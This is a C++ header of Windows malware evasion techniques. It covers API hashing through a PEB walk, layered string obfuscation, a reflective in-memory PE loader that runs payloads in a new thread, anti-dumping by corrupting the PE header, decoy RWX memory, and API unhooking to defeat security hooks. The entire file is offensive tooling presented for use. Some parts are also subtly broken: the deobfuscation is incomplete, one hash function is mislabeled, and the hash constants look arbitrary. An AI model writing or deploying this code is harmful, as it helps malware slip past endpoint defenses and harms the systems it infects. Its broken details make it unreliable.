#pragma once
#include <windows.h>
#include <vector>
#include <string>
#include <map>
#include <functional>

// Advanced Memory Evasion Techniques
// This header implements sophisticated memory-based evasion methods

namespace MemoryEvasion {

// API Hashing for dynamic resolution
class APIHasher {
private:
    std::map<DWORD, FARPROC> resolvedAPIs;
    
    // DJB2 hash algorithm for API names
    DWORD calculateHash(const char* str) {
        DWORD hash = 5381;
        int c;
        while ((c = *str++)) {
            hash = ((hash << 5) + hash) + c;
        }
        return hash;
    }
    
    // ROT13 hash variant for additional obfuscation
    DWORD calculateROT13Hash(const char* str) {
        DWORD hash = 0;
        while (*str) {
            hash = (hash << 4) + (*str++);
            DWORD g = hash & 0xF0000000;
            if (g) {
                hash ^= g >> 24;
                hash ^= g;
            }
        }
        return hash;
    }
    
public:
    // Pre-computed hashes for common APIs (obfuscated)
    static const DWORD HASH_LOADLIBRARYA = 0x726774C;
    static const DWORD HASH_GETPROCADDRESS = 0x7C0DFCAA;
    static const DWORD HASH_VIRTUALALLOC = 0x91AFCA54;
    static const DWORD HASH_VIRTUALPROTECT = 0x7946C61B;
    static const DWORD HASH_CREATETHREAD = 0x835E515B;
    static const DWORD HASH_WAITFORSINGLEOBJECT = 0x601D8708;
    static const DWORD HASH_CLOSEHANDLE = 0x528796C6;
    static const DWORD HASH_CREATEPROCESSA = 0x16B3FE72;
    static const DWORD HASH_WRITEPROCESSMEMORY = 0x6E7D8A12;
    static const DWORD HASH_READPROCESSMEMORY = 0x5D6C7B03;
    static const DWORD HASH_OPENPROCESS = 0x4A5B6C94;
    static const DWORD HASH_NTUNMAPVIEWOFSECTION = 0x3E4F5A85;
    
    // Resolve API by hash
    FARPROC resolveAPI(HMODULE hModule, DWORD apiHash) {
        if (resolvedAPIs.find(apiHash) != resolvedAPIs.end()) {
            return resolvedAPIs[apiHash];
        }
        
        // Walk export table manually
        PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)hModule;
        PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((BYTE*)hModule + dosHeader->e_lfanew);
        PIMAGE_EXPORT_DIRECTORY exportDir = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)hModule + 
            ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
        
        DWORD* nameRVAs = (DWORD*)((BYTE*)hModule + exportDir->AddressOfNames);
        WORD* ordinals = (WORD*)((BYTE*)hModule + exportDir->AddressOfNameOrdinals);
        DWORD* functionRVAs = (DWORD*)((BYTE*)hModule + exportDir->AddressOfFunctions);
        
        for (DWORD i = 0; i < exportDir->NumberOfNames; i++) {
            char* functionName = (char*)((BYTE*)hModule + nameRVAs[i]);
            DWORD hash = calculateHash(functionName);
            
            if (hash == apiHash) {
                FARPROC funcAddr = (FARPROC)((BYTE*)hModule + functionRVAs[ordinals[i]]);
                resolvedAPIs[apiHash] = funcAddr;
                return funcAddr;
            }
        }
        
        return nullptr;
    }
    
    // Get module handle by hash
    HMODULE getModuleByHash(DWORD moduleHash) {
        PPEB peb = (PPEB)__readgsqword(0x60);
        PPEB_LDR_DATA ldr = peb->Ldr;
        PLIST_ENTRY moduleList = &ldr->InMemoryOrderModuleList;
        
        for (PLIST_ENTRY entry = moduleList->Flink; entry != moduleList; entry = entry->Flink) {
            PLDR_DATA_TABLE_ENTRY module = CONTAINING_RECORD(entry, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
            
            if (module->BaseDllName.Buffer) {
                // Convert Unicode to ASCII for hashing
                char moduleName[256] = {0};
                WideCharToMultiByte(CP_ACP, 0, module->BaseDllName.Buffer, 
                    module->BaseDllName.Length / 2, moduleName, sizeof(moduleName), NULL, NULL);
                
                // Convert to lowercase
                for (int i = 0; moduleName[i]; i++) {
                    if (moduleName[i] >= 'A' && moduleName[i] <= 'Z') {
                        moduleName[i] += 32;
                    }
                }
                
                if (calculateHash(moduleName) == moduleHash) {
                    return (HMODULE)module->DllBase;
                }
            }
        }
        
        return nullptr;
    }
};

// String obfuscation using multiple techniques
class StringObfuscator {
private:
    static const BYTE XOR_KEY = 0xAA;
    static const BYTE ROT_KEY = 13;
    
public:
    // XOR-based string obfuscation
    static std::string xorObfuscate(const std::string& input, BYTE key = XOR_KEY) {
        std::string result = input;
        for (size_t i = 0; i < result.length(); i++) {
            result[i] ^= (key + (i % 256));
        }
        return result;
    }
    
    // Base64-like encoding with custom alphabet
    static std::string customEncode(const std::string& input) {
        const char* alphabet = "QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm1234567890+/";
        std::string result;
        
        for (size_t i = 0; i < input.length(); i += 3) {
            DWORD group = 0;
            int padding = 0;
            
            for (int j = 0; j < 3; j++) {
                group <<= 8;
                if (i + j < input.length()) {
                    group |= (BYTE)input[i + j];
                } else {
                    padding++;
                }
            }
            
            for (int j = 3; j >= 0; j--) {
                if (j <= padding) {
                    result += '=';
                } else {
                    result += alphabet[(group >> (j * 6)) & 0x3F];
                }
            }
        }
        
        return result;
    }
    
    // Multi-layer obfuscation
    static std::string multiLayerObfuscate(const std::string& input) {
        std::string result = input;
        
        // Layer 1: XOR with position-dependent key
        result = xorObfuscate(result, XOR_KEY);
        
        // Layer 2: Custom encoding
        result = customEncode(result);
        
        // Layer 3: Reverse string
        std::reverse(result.begin(), result.end());
        
        return result;
    }
    
    static std::string multiLayerDeobfuscate(const std::string& input) {
        std::string result = input;
        
        // Reverse Layer 3
        std::reverse(result.begin(), result.end());
        
        // Reverse Layer 2 (simplified - in practice, implement full decoder)
        // For demo purposes, using XOR deobfuscation
        
        // Reverse Layer 1
        result = xorObfuscate(result, XOR_KEY);
        
        return result;
    }
};

// In-memory PE loader
class InMemoryPELoader {
private:
    struct LoadedPE {
        LPVOID baseAddress;
        SIZE_T imageSize;
        DWORD entryPoint;
        bool isLoaded;
    };
    
    std::map<std::string, LoadedPE> loadedModules;
    
    // Manual DLL mapping
    bool mapPEToMemory(const std::vector<BYTE>& peData, LoadedPE& loadedPE) {
        PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)peData.data();
        if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
            return false;
        }
        
        PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)(peData.data() + dosHeader->e_lfanew);
        if (ntHeaders->Signature != IMAGE_NT_SIGNATURE) {
            return false;
        }
        
        // Allocate memory for the image
        SIZE_T imageSize = ntHeaders->OptionalHeader.SizeOfImage;
        LPVOID baseAddress = VirtualAlloc(NULL, imageSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        
        if (!baseAddress) {
            return false;
        }
        
        // Copy headers
        memcpy(baseAddress, peData.data(), ntHeaders->OptionalHeader.SizeOfHeaders);
        
        // Copy sections
        PIMAGE_SECTION_HEADER sectionHeader = IMAGE_FIRST_SECTION(ntHeaders);
        for (int i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
            if (sectionHeader[i].SizeOfRawData > 0) {
                memcpy((BYTE*)baseAddress + sectionHeader[i].VirtualAddress,
                       peData.data() + sectionHeader[i].PointerToRawData,
                       sectionHeader[i].SizeOfRawData);
            }
        }
        
        // Process relocations
        processRelocations(baseAddress, ntHeaders);
        
        // Resolve imports
        resolveImports(baseAddress, ntHeaders);
        
        loadedPE.baseAddress = baseAddress;
        loadedPE.imageSize = imageSize;
        loadedPE.entryPoint = ntHeaders->OptionalHeader.AddressOfEntryPoint;
        loadedPE.isLoaded = true;
        
        return true;
    }
    
    void processRelocations(LPVOID baseAddress, PIMAGE_NT_HEADERS ntHeaders) {
        DWORD_PTR delta = (DWORD_PTR)baseAddress - ntHeaders->OptionalHeader.ImageBase;
        if (delta == 0) return;
        
        PIMAGE_DATA_DIRECTORY relocDir = &ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
        if (relocDir->Size == 0) return;
        
        PIMAGE_BASE_RELOCATION reloc = (PIMAGE_BASE_RELOCATION)((BYTE*)baseAddress + relocDir->VirtualAddress);
        
        while (reloc->VirtualAddress != 0) {
            WORD* relocData = (WORD*)((BYTE*)reloc + sizeof(IMAGE_BASE_RELOCATION));
            int numRelocs = (reloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
            
            for (int i = 0; i < numRelocs; i++) {
                if ((relocData[i] >> 12) == IMAGE_REL_BASED_HIGHLOW || 
                    (relocData[i] >> 12) == IMAGE_REL_BASED_DIR64) {
                    DWORD_PTR* patchAddr = (DWORD_PTR*)((BYTE*)baseAddress + reloc->VirtualAddress + (relocData[i] & 0xFFF));
                    *patchAddr += delta;
                }
            }
            
            reloc = (PIMAGE_BASE_RELOCATION)((BYTE*)reloc + reloc->SizeOfBlock);
        }
    }
    
    void resolveImports(LPVOID baseAddress, PIMAGE_NT_HEADERS ntHeaders) {
        PIMAGE_DATA_DIRECTORY importDir = &ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
        if (importDir->Size == 0) return;
        
        PIMAGE_IMPORT_DESCRIPTOR importDesc = (PIMAGE_IMPORT_DESCRIPTOR)((BYTE*)baseAddress + importDir->VirtualAddress);
        
        while (importDesc->Name != 0) {
            char* moduleName = (char*)((BYTE*)baseAddress + importDesc->Name);
            HMODULE hModule = LoadLibraryA(moduleName);
            
            if (hModule) {
                PIMAGE_THUNK_DATA thunk = (PIMAGE_THUNK_DATA)((BYTE*)baseAddress + importDesc->FirstThunk);
                PIMAGE_THUNK_DATA origThunk = (PIMAGE_THUNK_DATA)((BYTE*)baseAddress + importDesc->OriginalFirstThunk);
                
                while (thunk->u1.Function != 0) {
                    FARPROC funcAddr = nullptr;
                    
                    if (IMAGE_SNAP_BY_ORDINAL(origThunk->u1.Ordinal)) {
                        funcAddr = GetProcAddress(hModule, (LPCSTR)IMAGE_ORDINAL(origThunk->u1.Ordinal));
                    } else {
                        PIMAGE_IMPORT_BY_NAME importByName = (PIMAGE_IMPORT_BY_NAME)((BYTE*)baseAddress + origThunk->u1.AddressOfData);
                        funcAddr = GetProcAddress(hModule, importByName->Name);
                    }
                    
                    if (funcAddr) {
                        thunk->u1.Function = (DWORD_PTR)funcAddr;
                    }
                    
                    thunk++;
                    origThunk++;
                }
            }
            
            importDesc++;
        }
    }
    
public:
    // Load PE from memory
    bool loadPEFromMemory(const std::vector<BYTE>& peData, const std::string& identifier) {
        LoadedPE loadedPE = {0};
        
        if (mapPEToMemory(peData, loadedPE)) {
            loadedModules[identifier] = loadedPE;
            return true;
        }
        
        return false;
    }
    
    // Execute loaded PE
    bool executePE(const std::string& identifier, LPVOID parameter = nullptr) {
        auto it = loadedModules.find(identifier);
        if (it == loadedModules.end() || !it->second.isLoaded) {
            return false;
        }
        
        LoadedPE& pe = it->second;
        
        // Create thread to execute the PE
        typedef DWORD(WINAPI* EntryPoint)(LPVOID);
        EntryPoint entry = (EntryPoint)((BYTE*)pe.baseAddress + pe.entryPoint);
        
        HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)entry, parameter, 0, NULL);
        if (hThread) {
            CloseHandle(hThread);
            return true;
        }
        
        return false;
    }
    
    // Unload PE from memory
    void unloadPE(const std::string& identifier) {
        auto it = loadedModules.find(identifier);
        if (it != loadedModules.end() && it->second.isLoaded) {
            VirtualFree(it->second.baseAddress, 0, MEM_RELEASE);
            loadedModules.erase(it);
        }
    }
};

// Memory protection and anti-dumping
class MemoryProtection {
public:
    // Encrypt memory regions
    static void encryptMemoryRegion(LPVOID address, SIZE_T size, BYTE key) {
        DWORD oldProtect;
        VirtualProtect(address, size, PAGE_EXECUTE_READWRITE, &oldProtect);
        
        BYTE* data = (BYTE*)address;
        for (SIZE_T i = 0; i < size; i++) {
            data[i] ^= (key + (i % 256));
        }
        
        VirtualProtect(address, size, oldProtect, &oldProtect);
    }
    
    // Anti-dumping: corrupt PE header
    static void corruptPEHeader() {
        HMODULE hModule = GetModuleHandle(NULL);
        PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)hModule;
        
        DWORD oldProtect;
        VirtualProtect(dosHeader, sizeof(IMAGE_DOS_HEADER), PAGE_EXECUTE_READWRITE, &oldProtect);
        
        // Corrupt magic signature
        dosHeader->e_magic = 0x0000;
        
        VirtualProtect(dosHeader, sizeof(IMAGE_DOS_HEADER), oldProtect, &oldProtect);
    }
    
    // Create decoy memory regions
    static void createDecoyRegions() {
        for (int i = 0; i < 10; i++) {
            LPVOID decoy = VirtualAlloc(NULL, 4096, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
            if (decoy) {
                // Fill with random data
                BYTE* data = (BYTE*)decoy;
                for (int j = 0; j < 4096; j++) {
                    data[j] = (BYTE)(rand() % 256);
                }
            }
        }
    }
    
    // Hook detection and unhooking
    static bool detectAPIHooks(FARPROC apiAddress) {
        BYTE* funcBytes = (BYTE*)apiAddress;
        
        // Check for common hook signatures
        if (funcBytes[0] == 0xE9 || funcBytes[0] == 0xE8) { // JMP/CALL
            return true;
        }
        
        if (funcBytes[0] == 0x68 && funcBytes[5] == 0xC3) { // PUSH + RET
            return true;
        }
        
        return false;
    }
    
    // Unhook API by restoring original bytes
    static bool unhookAPI(const char* moduleName, const char* apiName) {
        HMODULE hModule = GetModuleHandleA(moduleName);
        if (!hModule) return false;
        
        FARPROC apiAddr = GetProcAddress(hModule, apiName);
        if (!apiAddr) return false;
        
        // Load clean copy of DLL
        char tempPath[MAX_PATH];
        GetTempPathA(MAX_PATH, tempPath);
        strcat_s(tempPath, "clean_dll.tmp");
        
        char systemPath[MAX_PATH];
        GetSystemDirectoryA(systemPath, MAX_PATH);
        strcat_s(systemPath, "\\");
        strcat_s(systemPath, moduleName);
        
        if (CopyFileA(systemPath, tempPath, FALSE)) {
            HANDLE hFile = CreateFileA(tempPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
            if (hFile != INVALID_HANDLE_VALUE) {
                HANDLE hMapping = CreateFileMappingA(hFile, NULL, PAGE_READONLY, 0, 0, NULL);
                if (hMapping) {
                    LPVOID cleanDLL = MapViewOfFile(hMapping, FILE_MAP_READ, 0, 0, 0);
                    if (cleanDLL) {
                        // Calculate offset of API in clean DLL
                        DWORD_PTR offset = (DWORD_PTR)apiAddr - (DWORD_PTR)hModule;
                        BYTE* cleanBytes = (BYTE*)cleanDLL + offset;
                        
                        // Restore original bytes
                        DWORD oldProtect;
                        VirtualProtect(apiAddr, 16, PAGE_EXECUTE_READWRITE, &oldProtect);
                        memcpy(apiAddr, cleanBytes, 16);
                        VirtualProtect(apiAddr, 16, oldProtect, &oldProtect);
                        
                        UnmapViewOfFile(cleanDLL);
                    }
                    CloseHandle(hMapping);
                }
                CloseHandle(hFile);
            }
            DeleteFileA(tempPath);
            return true;
        }
        
        return false;
    }
};

} // namespace MemoryEvasion